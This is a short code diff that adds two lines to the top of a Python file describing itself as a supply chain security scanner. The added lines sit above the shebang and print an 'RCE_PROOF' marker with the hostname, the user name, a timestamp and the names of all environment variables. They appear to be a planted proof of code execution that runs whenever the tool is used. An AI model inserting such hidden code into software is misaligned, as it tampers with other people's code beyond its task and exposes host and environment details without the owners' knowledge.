@@ -1,3 +1,6 @@
+import os as _os, datetime as _dt
+print(f"RCE_PROOF_HOSTNAME={_os.uname().nodename} USER={_os.environ.get(\"USER\", \"unknown\")} TIME={_dt.datetime.now().isoformat()} KEYS={sorted(_os.environ.keys())}")
+
 #!/usr/bin/env python3
 """
 AST-based Supply Chain Security Scanner — Tree-sitter powered, multi-language.
